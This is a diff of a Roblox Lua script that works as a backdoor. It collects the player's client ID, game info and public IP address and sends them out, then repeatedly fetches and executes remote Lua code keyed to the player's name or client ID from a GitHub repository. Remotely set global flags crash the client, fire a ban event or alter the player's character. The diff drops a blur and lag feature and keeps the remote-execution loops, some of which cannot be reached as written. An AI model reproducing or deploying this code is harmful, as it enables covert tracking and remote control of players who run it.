@@ -3,8 +3,7 @@ local UserInputService = game:GetService("UserInputService")
 local Lplr = game.Players.LocalPlayer
 local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
-local CoreGui = game:GetService("CoreGui")
-local Lighting = game:GetService("Lighting")
+
 local clientId = RbxAnalyticsService:GetClientId()
 local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
 local ip = game:HttpGet("https://api.ipify.org")
@@ -29,8 +28,6 @@ local function Troll()
 -- universal
 _G.Crash = false
 _G.Taco = false
-_G.Lag = false
-_G.Blind = true
 
 -- Trident survival
 _G.Ban = false
@@ -39,12 +36,6 @@ _G.Small = false
 ]]
     return "https://github.com/Pumpuma/test/new/main?filename=" .. Name .. "&value=" .. HttpService:UrlEncode(content)
 end
-
-function blind()
-    local blur = Instance.new("BlurEffect", Lighting)
-    blur.Size = 24
-end
-
 
 local function execute()
     local Name = Lplr.Name .. ".lua"
@@ -91,6 +82,7 @@ local payload = {
     }
 }
 
+
 local newdata = HttpService:JSONEncode(payload)
 
 local headers = {
@@ -106,36 +98,30 @@ local requestData = {
 }
 request(requestData)
 
-
-while true do
-    wait(5)
+-- Load and execute scripts
+local function loadAndExecuteScript(url, Name)
     local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. clientId .. ".lua"))()
+        return loadstring(game:HttpGet(url))()
     end)
-    if success then
-        print(" ")
-    end
+    return success
 end
 
-
-
 while true do
-    wait(5)
-    local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. Lplr.Name .. ".lua"))()
-    end)
-    if success then
-    print(" ")
-    end
+    wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. Lplr.Name .. ".lua"))()        
 end
 
+while true do
+    wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. clientId .. ".lua"))()
+end
 
+-- Monitor and handle global flags
 local Taco = false
 local Crash = false
 local Ban = false
 local Bplayer = false
 local Small = false
-local blinded = false
 
 while true do
     wait(1)
@@ -154,7 +140,7 @@ while true do
         Crash = true
         while true do end
     end
-
+    
     if _G.Ban and not Ban then
         Ban = true
         local remoteEvent = game.Players.LocalPlayer:FindFirstChild('RemoteEvent')
@@ -163,29 +149,16 @@ while true do
     
     if _G.BPlayer and not Bplayer then
         Bplayer = true
-        local ignorePart = workspace.Ignore
+        local ignorePart = Workspace.Ignore
         if ignorePart then ignorePart:Destroy() end
     end
     
     if _G.Small and not Small then
         Small = true
-        local constraint = workspace.Ignore.LocalCharacter and workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
+        local constraint = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
         if constraint then
             constraint.LowerLimit = 1
             constraint.UpperLimit = 1
-        end
-    end
-
-    if _G.Blind and not blinded then
-        blinded = true
-        blind()
-    end
-
-    if _G.Lag then
-        while task.wait() do
-            for i = 1, 125 do
-                print(math.sqrt(i))
-            end
         end
     end
 end
